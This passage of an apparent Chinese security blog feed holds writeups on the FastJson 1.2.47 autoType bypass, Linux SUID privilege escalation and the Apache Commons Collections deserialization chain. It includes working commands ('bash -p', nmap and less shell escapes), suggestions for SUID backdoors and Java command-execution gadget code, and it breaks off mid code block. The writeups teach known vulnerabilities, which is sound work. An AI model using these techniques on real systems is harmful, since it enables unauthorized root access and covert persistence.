class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="keyword">int</span> features) &#123;</span><br><span class="line">      <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="comment">//对字符长度进行限制</span></span><br><span class="line">      <span class="keyword">if</span> (typeName.length() &gt;= <span class="number">128</span> || typeName.length() &lt; <span class="number">3</span>) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="comment">//替换操作</span></span><br><span class="line">      String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line">      Class&lt;?&gt; clazz = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">long</span> BASIC = <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">long</span> PRIME = <span class="number">0x100000001b3L</span>;</span><br><span class="line">      <span class="comment">//检测是否是[开头，是的话则抛出异常</span></span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">long</span> h1 = (BASIC ^ className.charAt(<span class="number">0</span>)) * PRIME;</span><br><span class="line">      <span class="keyword">if</span> (h1 == <span class="number">0xaf64164c86024f1aL</span>) &#123; <span class="comment">// [</span></span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="comment">//检测是否是L开头和;结尾，是的话则抛出异常</span></span><br><span class="line">      <span class="keyword">if</span> ((h1 ^ className.charAt(className.length() - <span class="number">1</span>)) * PRIME == <span class="number">0x9198507b5af98f0L</span>) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">long</span> h3 = (((((BASIC ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">              * PRIME)</span><br><span class="line">              ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">              * PRIME)</span><br><span class="line">              ^ className.charAt(<span class="number">2</span>))</span><br><span class="line">              * PRIME;</span><br><span class="line"><span class="comment">//是否开启名单检测，autoTypeSupport默认false</span></span><br><span class="line">      <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">          <span class="keyword">long</span> hash = h3;</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">              hash ^= className.charAt(i);</span><br><span class="line">              hash *= PRIME;</span><br><span class="line">              <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                  clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                  <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                      <span class="keyword">return</span> clazz;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//尝试从Mapping中通过类名获取该类</span></span><br><span class="line">      <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">          clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="comment">//尝试从反序列化器中通过类名获取该类</span></span><br><span class="line">      <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">          clazz = deserializers.findClass(typeName);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//如果获取到了该类，直接返回实例，不再向下进行</span></span><br><span class="line">      <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span> (expectClass != <span class="keyword">null</span></span><br><span class="line">                  &amp;&amp; clazz != java.util.HashMap<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class">                  &amp;&amp; !<span class="title">expectClass</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)) </span>&#123;</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> clazz;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//前面clazz仍为空并且白名单开启情况进入if函数</span></span><br><span class="line">      <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">          <span class="keyword">long</span> hash = h3;</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">              <span class="keyword">char</span> c = className.charAt(i);</span><br><span class="line">              hash ^= c;</span><br><span class="line">              hash *= PRIME;</span><br><span class="line">   <span class="comment">//类名在黑名单中直接抛出异常</span></span><br><span class="line">              <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="comment">//类名在白名单中加载该类</span></span><br><span class="line">              <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                  <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">                      clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span class="line">                  <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                      <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span class="line">                  <span class="keyword">return</span> clazz;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="comment">//当上面检测仍无法获取clazz时，进入loadClass函数加载</span></span><br><span class="line">      <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">          clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span> (TypeUtils.getAnnotation(clazz,JSONType<span class="class">.<span class="keyword">class</span>) !</span>= <span class="keyword">null</span>) &#123;</span><br><span class="line">              <span class="keyword">return</span> clazz;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (ClassLoader<span class="class">.<span class="keyword">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>) // <span class="title">classloader</span> <span class="title">is</span> <span class="title">danger</span></span></span><br><span class="line"><span class="class">                  || <span class="title">DataSource</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>) // <span class="title">dataSource</span> <span class="title">can</span> <span class="title">load</span> <span class="title">jdbc</span> <span class="title">driver</span></span></span><br><span class="line"><span class="class">                  ) </span>&#123;</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">              <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                  <span class="keyword">return</span> clazz;</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy);</span><br><span class="line">          <span class="keyword">if</span> (beanInfo.creatorConstructor != <span class="keyword">null</span> &amp;&amp; autoTypeSupport) &#123;</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">int</span> mask = Feature.SupportAutoType.mask;</span><br><span class="line">      <span class="keyword">boolean</span> autoTypeSupport = <span class="keyword">this</span>.autoTypeSupport</span><br><span class="line">              || (features &amp; mask) != <span class="number">0</span></span><br><span class="line">              || (JSON.DEFAULT_PARSER_FEATURE &amp; mask) != <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> clazz;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>此方法的绕过思路大致为，首先传入<code>java.lang.Class</code>类通过设置val将<code>com.sun.rowset.JdbcRowSetImp</code>加载进map缓存，在第二次解析恶意类是，因为map缓存中存在了<code>com.sun.rowset.JdbcRowSetImp</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null)</span><br></pre></td></tr></table></figure><p>此if语句对恶意类的判读无效，因此无论是否开启autotype都不会抛出异常，并且在下面语句中从map缓存中取出该类：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/FastJson/image-20200502163643695.png" alt="image-20200502163643695"></p><p>至于具体是如何通过<code>class.lang.Class</code>将恶意类加入缓存的，就不在这里详细分析了，具体可参考：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/t/5680</span><br></pre></td></tr></table></figure><p>实验环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.47-rce</span><br></pre></td></tr></table></figure><h2 id="时间线-10"><a href="#时间线-10" class="headerlink" title="时间线-10"></a>时间线-10</h2><p>在1.2.48版本，将map缓存关闭并将<code>java.lang.Class</code>加入了检测黑名单。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/vuls/208339.html</span><br><span class="line">https://p0sec.net/index.php/archives/123/</span><br><span class="line">https://xz.aliyun.com/t/7027#toc-21</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;基于时间线的方式分析FastJson反序列化漏洞。&lt;/p&gt;
    
    </summary>
    
    
      <category term="JavaSec" scheme="https://www.sys71m.top/categories/JavaSec/"/>
    
    
      <category term="FastJson" scheme="https://www.sys71m.top/tags/FastJson/"/>
    
      <category term="反序列化" scheme="https://www.sys71m.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>浅析Linux下SUID提权</title>
    <link href="https://www.sys71m.top/2020/04/28/%E6%B5%85%E6%9E%90Linux%E4%B8%8BSUID%E6%8F%90%E6%9D%83/"/>
    <id>https://www.sys71m.top/2020/04/28/%E6%B5%85%E6%9E%90Linux%E4%B8%8BSUID%E6%8F%90%E6%9D%83/</id>
    <published>2020-04-28T04:01:18.000Z</published>
    <updated>2020-11-04T23:46:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>Linux下SUID提权入门</p><a id="more"></a>  <h2 id="什么是SUID"><a href="#什么是SUID" class="headerlink" title="什么是SUID"></a>什么是SUID</h2><p>说到<code>suid</code>提取，就必须先要解释下什么是<code>suid</code>。<code>suid</code>全称为<code>Set owner User ID up on execution</code>，通过字面的意思也可以理解：在执行时设置所有者用户的id。这是<code>Linux</code>给可执行文件的一个属性，<code>suid</code>权限仅对二进制可执行文件有效。</p><h2 id="SUID作用"><a href="#SUID作用" class="headerlink" title="SUID作用"></a>SUID作用</h2><p>通常来说，<code>Linux</code>执行程序是以当前用户权限来运行，但对于一些特殊的指令，就需要用到<code>suid</code>权限。例如普通用户修改个人密码需要用到<code>passwd</code>命令，我们知道<code>/etc/passwd</code>文件中每一行都存储着用户的一些基本属性，如用户名、口令、用户标识号、组标识号、注释性描述、主目录、登录Shell等信息，通过<code>passwd</code>命令修改密码也会对<code>/etc/passwd</code>文件进行修改，查看下<code>/etc/passwd</code>文件权限：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin@kali:/$ ls -al /etc/passwd</span><br><span class="line">-rw-r--r-- 1 root root 3328 4月  22 01:15 /etc/passwd</span><br></pre></td></tr></table></figure><p>可以看出，<code>/etc/passwd</code>文件对所有用户可读，但只允许<code>root</code>用户写入。但在实际修改密码的过程中，并不需要转为<code>root</code>权限或使用<code>sudo</code>命令，查看下<code>passwd</code>命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin@kali:/$ ls -al $(which passwd)</span><br><span class="line">-rwsr-xr-x 1 root root 63736 7月  27  2018 /usr/bin/passwd</span><br></pre></td></tr></table></figure><p>一般来说，大部分文件对权限的划分可分为<code>r</code>可读、<code>w</code>可写、<code>x</code>可执行这三种权限。通过查看<code>passwd</code>命令发现，文件拥有者的<code>x</code>权限变为了<code>s</code>权限，这里的<code>s</code>权限就是上面提到的<code>suid</code>权限。</p><p>当文件的拥有者的<code>x</code>权限被设为<code>s</code>权限时，其他用户在执行该二进制文件时便会临时被赋予文件拥有者的权限，这里的<code>passwd</code>命令的拥有者为<code>root</code>用户，这也就解释了为什么普通用户修改密码时不需要切换为<code>root</code>用户或者使用<code>sudo</code>命令。</p><p>这里先总结下使用<code>suid</code>权限的一些限制：</p><ul><li><code>suid</code>权限仅对二进制可执行文件有效</li><li>执行者需要对该文件具有<code>x</code>权限</li><li><code>suid</code>权限仅在执行过程中有效</li><li>执行者将具有该文件拥有者的权限</li></ul><p>除了<code>passwd</code>命令设为了<code>suid</code>权限，还可通过<code>find / -perm -u=s -type f 2&gt;/dev/null</code>命令查找具有<code>suid</code>权限的命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/表示从文件系统的顶部（根）开始并找到每个目录</span><br><span class="line">-perm 表示搜索随后的权限</span><br><span class="line">-u=s表示查找root用户拥有的文件</span><br><span class="line">-type表示我们正在寻找的文件类型</span><br><span class="line">f 表示常规文件，而不是目录或特殊文件</span><br><span class="line">2表示该进程的第二个文件描述符，即stderr（标准错误）</span><br><span class="line">&gt;表示重定向</span><br><span class="line">/dev/null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/suid/image-20200422141217111.png" alt="image-20200422141217111"></p><h2 id="利用SUID提权"><a href="#利用SUID提权" class="headerlink" title="利用SUID提权"></a>利用SUID提权</h2><p>这里直接使用VulnHub上的靶机来做演示，靶机地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/dc-1,292/</span><br></pre></td></tr></table></figure><p>此靶机的渗透流程这里就不做具体介绍，可参考如下文章：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/articles/network/218073.html</span><br></pre></td></tr></table></figure><p>在使用msf的<code>shell</code>命令获取一个交互式shell后，发现当前用户为<code>www-data</code>，<code>www-data</code>是默认运行web服务的用户/组，一般在通过apt安装web服务程序时生成。</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/suid/image-20200422154354642.png" alt="image-20200422154354642"></p><p>这里的<code>www-data</code>权限较低，只能执行部分操作，使用<code>find / -perm -u=s -type f 2&gt;/dev/null</code>查找设置为<code>suid</code>权限的命令。</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/suid/image-20200422154530824.png" alt="image-20200422154530824"></p><p>重点关注<code>/usr/bin/find</code>命令，他是用来在指定目录下查找文件的命令。使用<code>man help</code>命令查看find的具体使用方式，发现存在<code>-exec</code>参数：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/suid/image-20200422160357025.png" alt="image-20200422160357025"></p><p>这个参数主要作用是方便查找结束的后续操作，它的终止是以 <code>;</code> 为结束标志的，利用此参数进行<code>suid</code>提权：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/suid/image-20200422165707326.png" alt="image-20200422165707326"></p><h2 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><p>较旧版本的<code>Nmap</code>（5.20之前）带有<code>interactive</code>交互模式允许用户执行shell命令，因此可以通过这个模式来提权，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">nmap&gt;</span><span class="bash"> !sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>针对5.20之后版本，网上有说可以通过加载自定义script的方式来执行命令，在本地进行测试，并没有提权，结果与P神文章中的结论一致，有关无法提权的具体原因可查看如下文章：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/suid/image-20200422171253930.png" alt="image-20200422171253930"></p><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><p>使用<code>bash -p</code>命令将以root身份打开一个bash shell。</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/suid/image-20200422173655213.png" alt="image-20200422173655213"></p><h3 id="Less"><a href="#Less" class="headerlink" title="Less"></a>Less</h3><p>less 与 more 类似，都适用于查看文件内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><h3 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h3><p>上面提到的命令都是可直接提权为root的，有些设置<code>suid</code>的命令虽无法直接提权，但可获取重要的系统信息，如<code>cat</code>命令读取敏感文件，<code>cp</code>命令用来替换<code>/etc/sudoers</code>文件来间接提权。因此在实际的提权过程中要有灵活的思路，有时候可通过组合拳的方式来达到提权的目的。</p><p>更多利用方式参考如下链接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gtfobins.github.io/</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>假如作为系统的运维人员，要严格的查看被设置<code>suid</code>权限的二进制文件，是否有必要进行提权后操作。如果不可避免的需要root权限来进行操作，设置<code>suid</code>虽然可行，但不满足权限最小化的要求，也有可能带来安全问题。从Linux内核 2.2 开始，Linux 将传统上与超级用户 root 关联的特权划分为不同的单元，称为<code>capabilites</code>，root的权限被分隔成很多子权限，这就避免了滥用特权的问题。</p><p>类似于<code>ping</code>和<code>nmap</code>这样的程序，只需要网络相关的特权即可。通过<code>capabilities</code>机制来划分权限，可以看到在<code>kali</code>系统下，<code>ping</code>命令就没有设置<code>suid</code>权限，普通用户依然可以使用。</p><p>假如作为渗透测试人员，可以利用<code>suid</code>的特性提权或者留下后门。如将<code>usermod</code>命令设置<code>suid</code>权限，将<code>/bin/bash</code>命令复制为一个隐藏文件并设置<code>suid</code>权限，等等。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</span><br><span class="line">https://www.anquanke.com/post/id/86979</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Linux下SUID提权入门&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://www.sys71m.top/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://www.sys71m.top/tags/Linux/"/>
    
      <category term="SUID" scheme="https://www.sys71m.top/tags/SUID/"/>
    
  </entry>
  
  <entry>
    <title>Apache Commons Collections反序列化漏洞</title>
    <link href="https://www.sys71m.top/2020/04/18/Apache%20Commons%20Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.sys71m.top/2020/04/18/Apache%20Commons%20Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-04-18T11:05:18.000Z</published>
    <updated>2020-11-04T23:46:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>Apache Commons Collections&lt;=3.2.1反序列化漏洞是Java反序列化的经典漏洞，Apache-commons-collections组件为Java提供了很多基础常用且强大的数据结构，方便开发。本次分析的版本选择3.1。</p><a id="more"></a>  <p>Apache Commons Collections反序列化漏洞的最早的commit记录是2015年1月29日,说明这个漏洞可能早在2014年甚至更早就已经被人所利用，利用方式被人公开后直接引发了Java生态系统的大地震，与此同时Java反序列化漏洞仿佛掀起了燎原之势，无数的使用了反序列化机制的Java应用系统惨遭黑客疯狂的攻击，为企业安全甚至是国家安全带来了沉重的打击！（摘自javasec.org）</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Apache Commons Collections&lt;=3.2.1反序列化漏洞是Java反序列化的经典漏洞，Apache-commons-collections组件为Java提供了很多基础常用且强大的数据结构，方便开发。本地分析的版本选择3.1。</p><p>创建一个简单的maven项目（比如<code>maven-archetype-quickstart</code>）：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Apache-commons-collections/image-20200418150424803.png" alt="image-20200418150424803"></p><p>在<code>pom.xml</code>添加依赖：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Apache-commons-collections/image-20200418150541926.png" alt="image-20200418150541926"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="触发点"><a href="#触发点" class="headerlink" title="触发点"></a>触发点</h3><p>定位到<code>org.apache.commons.collections</code>。</p><p>漏洞的主要问题出现在<code>InvokerTransformer</code>类的<code>transform</code>方法，这个类实现了<code>Transformer</code>和<code>Serializable</code>接口，意味着这个类是可以被序列化的。</p><p><code>Transformer</code>接口定义了将输入对象转换为输出对象的方法，如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Apache-commons-collections/image-20200418151550815.png" alt="image-20200418151550815"></p><p><code>InvokerTransformer</code>类对<code>transform</code>方法进行了实现，如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Apache-commons-collections/image-20200418151203090.png" alt="image-20200418151203090"></p><p>根据<code>InvokerTransformer</code>类的实现方式我们可以知道，大致逻辑为会获取输入类的类对象，根据输入的方法名(<code>iMethodName</code>)和参数类型(<code>iParamTypes</code>)获取指定的反射方法对象，接下来反射调用指定的方法并返回方法调用结果。</p><p>通过刚才的分析，可以发现直接使用<code>InvokerTransformer</code>类便可进行命令执行。</p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    String cmd = <span class="string">"calc"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构建transformer对象</span></span><br><span class="line">    InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">            "exec", new Class[]&#123;String.class&#125;, new Object[]&#123;cmd&#125;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 传入Runtime实例，执行对象转换操作</span></span><br><span class="line">    transformer.transform(Runtime.getRuntime());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Apache-commons-collections/image-20200418152453440.png" alt="image-20200418152453440"></p><p>真实场景中，没法在调用<code>transformer.transform</code>的时候直接传入<code>Runtime.getRuntime()</code>对象的。但这也在另一方面说明此处可以触发命令执行的漏洞，接下来开始寻找利用链。</p><h3 id="寻找利用链"><a href="#寻找利用链" class="headerlink" title="寻找利用链"></a>寻找利用链</h3><p>接下来是另外一个重要的类<code>ChainedTransformer</code>，该类同样实现了<code>Transformer</code>和<code>Serializable</code>接口，也可以被序列化。</p><p>该类对<code>transform</code>方法的实现逻辑如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Apache-commons-collections/image-20200418153410965.png" alt="image-20200418153410965"></p><p>从实现逻辑上可以看出，该方法会对<code>iTransformers</code>数组中的对象依次调用其<code>transform</code>方法。并将上一次调用的结果对象传入。</p><p>接来下需要考虑如何将<code>Runtime</code>对象传入，作为初始的<code>object</code>被<code>InvokerTransformer</code>的<code>transform</code>方法调用。</p><p>恰巧<code>ConstantTransformer</code>类存在<code>transform</code>方法，并直接返回构造时传入的对象。</p><p>代码如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Apache-commons-collections/image-20200418154538388.png" alt="image-20200418154538388"></p><p>利用上面提到的几个类，构造如下利用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span 